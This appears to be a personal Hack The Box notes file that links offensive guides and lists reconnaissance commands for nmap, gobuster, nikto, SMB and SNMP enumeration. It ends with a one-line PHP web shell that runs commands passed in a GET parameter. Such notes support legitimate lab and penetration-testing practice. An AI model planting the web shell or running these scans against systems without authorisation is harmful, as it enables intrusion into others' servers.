# htb_notes

## OWASP

[Sql Injection](https://sechow.com/bricks/docs/login-1.html)
>
[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Linux

[5 Ways to Directory Bruteforcing on Web Server](https://www.hackingarticles.in/5-ways-directory-bruteforcing-web-server/)
>
[Privilege Escalation via Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

## Windows

[Abusing SeLoadDriverPrivilege for privilege escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)

## Helpful Commands

### Nmap

#### Quick TCP Scan

nmap -A vv -oA quick -targetip-

#### Quick UDP Scan

nmap -A -sU -oA udp -targetip-

#### Full TCP Scan

nmap -A -p- -oA full -targetip-

### Content Discovery

#### Gobuster

gobuster dir -u -targetip- -w /usr/share/wordlist/dirbuster/directory-medium-23.txt -t 50

#### Gobuster with file extension

gobuster dir -u -targetip- -w /usr/share/wordlist/dirbuster/directory-medium-23.txt -t 50 -x php

#### Nikto web server scan

nikto -h -targetip-

#### Wordpress scan

wpscan -u -targetip- -e

#### Netcat banner grab

nc -v -tagretip- -port-

#### Telnet banner grab

telnet -targetip- -port-

### SMB

#### SMB Vulnerability Scan

nmap -p 445 -vv -script vuln -p 139,445 -targetip-

### Enum4linux

enum4linux -a target

### Null connect

rpcclient -U "" target

#### Connect to SMB share

smbclient //MOUNT/share

### SNMP

#### SNMP enumeration

snmp-check target

#### Reverse Shells

[Revere Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

#### Remote Desktop

Remote Desktop for windows with share and 85% screen
rdesktop -u username -p password -g 85% -r disk:share=/root/ target

### PHP

#### PHP command injection from GET Request

-?php echo system($_GET["cmd"]);?-



